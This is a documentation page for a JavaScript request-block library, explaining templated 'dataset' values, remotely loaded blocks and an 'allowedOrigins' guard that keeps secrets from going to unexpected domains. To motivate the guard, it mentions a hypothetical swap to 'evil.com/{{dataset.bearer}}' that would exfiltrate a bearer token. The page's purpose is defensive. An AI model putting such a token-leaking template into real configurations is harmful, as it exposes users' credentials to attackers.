---
sidebar_position: 3
---

#  Using Datasets

You'll see in the example above `{{dataset.bearer}}`. When you call `block.run` you can pass in some options, one of them is a special object called `dataset` (name borrowed from [HTMLElement.dataset](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/dataset)). And string value in the block is passed through a [liquid template](https://shopify.github.io/liquid/) to flatten those values into the strings. Here's an example:

```js
let block = new fetchblock([
  {
    resource:
      "https://x-colors.herokuapp.com/api/hex2rgb?value={{dataset.hex}}",
  },
]);
let response = await block.run({
  dataset: {
    hex: "000000",
  },
}); // {"hex":"#000000","rgb":"rgb(0, 0, 0)"}
```

Now the caller can pass in a different value. Why is this useful? Because the blocks can also be hosted remotely or reused. For example:

```js
let block = fetchblocks.loadFromURI(
  "https://gist.githubusercontent.com/bgrins/fc9cf06de8b0118bd18e4c3d08cd092b/raw/f3d4fb66655cc2e669a1c83679953b9f3b39e2ca/test.json"
);
let response = await block.run({
  dataset: {
    hex: "ff00ff",
  },
}); // {"hex":"#FF00FF","rgb":"rgb(255, 0, 255)"}
```

You may worry about seeing `dataset.bearer` above. What if the upstream URL changed the block from `"https://api.notion.com/v1/databases/{{dataset.databaseid}}/query"` to `"evil.com/{{dataset.bearer}}"`?

There's a way to prevent this, inspired by [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS). If you pass the dataset as an object with `allowedOrigins` then the fetchblock will throw before attempting to make a request if the domain doesn't match. For example, this will work:

```js
let block = new fetchblock([
  {
    resource:
// highlight-start
      "https://api.notion.com/v1/databases/{{dataset.databaseid}}/query",
// highlight-end
    method: "POST",
    headers: {
      "Notion-Version": "2022-02-22",
      Authorization: "Bearer {{dataset.bearer}}",
    },
  },
]);
let response = await block.run({
  dataset: {
    bearer: {
      value: "secret",
// highlight-start
      allowedOrigins: ["https://api.notion.com"],
// highlight-end
    }
  },
});
```

But if you either omit `allowedOrigins` or set it to an array that doesn't include the domain that's about to be contacted, it will throw an exception:

```js
// Error: Uncaught (in promise) Error: Aborting.
// Attempted to use a disallowed key: bearer at origin
// https://api.notion.com. Allowed origins: https://api.slack.com
let response = await block.run({
  dataset: {
    bearer: {
      value: "secret",
// highlight-start
      allowedOrigins: ["https://api.slack.com"],
// highlight-end
    }
  },
});
```